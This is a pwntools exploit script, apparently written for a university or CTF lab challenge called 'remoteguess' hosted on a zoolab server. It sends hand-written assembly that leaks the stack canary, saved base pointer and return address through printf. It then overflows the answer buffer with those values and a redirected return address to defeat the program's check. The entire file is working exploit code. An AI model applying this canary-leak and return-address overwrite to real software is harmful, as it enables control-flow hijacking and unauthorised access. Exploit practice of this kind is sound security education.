#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)  #local
# r = process("./remoteguess")  #local
# r = process("qemu-x86_64-static -E NO_SANDBOX=1 ./remoteguess", shell=True)  #local
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)  # remote

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# asm code start
myAsm = asm('solver:')
myAsm += asm('push rbp')
myAsm += asm('mov rbp, rsp')
myAsm += asm('sub rsp, 0x30')
myAsm += asm('mov rax, rdi')
myAsm += asm('mov rsi, QWORD PTR [rbp]')  # rbp
myAsm += asm('mov rdx, QWORD PTR [rsi - 0x8]')  # canary rdx (why do it need to use rsi instead of rbp?)***
myAsm += asm('mov rcx, QWORD PTR [rbp + 0x8]')  # return address
myAsm += asm('lea rdi, [rip + 0x4]')
myAsm += asm('call rax')
myAsm += asm('leave')
myAsm += asm('ret')
myAsm += b'%016lx\n%016lx\n%016lx\n'

payload = myAsm
# asm code end

if payload != None:
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())  # How many bytes of the solver executable do you want to send to me?
    r.sendlineafter(b'to call? ', str(0).encode())  # What relative address in the executable do you want to call?
    r.sendafter(b'bytes): ', payload)

    # gdb.attach(r)

    print("** end of sending payload to server **")

    # my code
    msg = r.recvline()

    rbp = r.recvline(keepends=False)
    print("****** rbp: " + str(rbp))

    canary = r.recvline(keepends=False)
    print("****** canary: " + str(canary))

    returnAddrSolver = r.recvline(keepends=False).decode()
    print("****** return addrsolver: " + str(returnAddrSolver))

    msg = r.recvline()

    offsetToGuess = 0xab  # because: a2ff -> a3aa
    returnAddr = int(returnAddrSolver, 16) + offsetToGuess
    # gdb.attach(r)

    myguess = 0
    ans = str(myguess).encode('ascii').ljust(24, b'\0')  # guess: buf[16] + int val + int sz
    print("**** ans (myguess): " + str(ans))

    # p64 -> number to ascii
    ans += p64(int(canary, 16))
    ans += p64(int(rbp, 16))
    ans += p64(returnAddr)
    ans += (b'\0'* 8)  # ???8
    ans += p64(myguess) # magic
    
    print("**** ans: " + str(ans))
    r.sendafter(b'answer? ', ans)
    # end of my code

else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :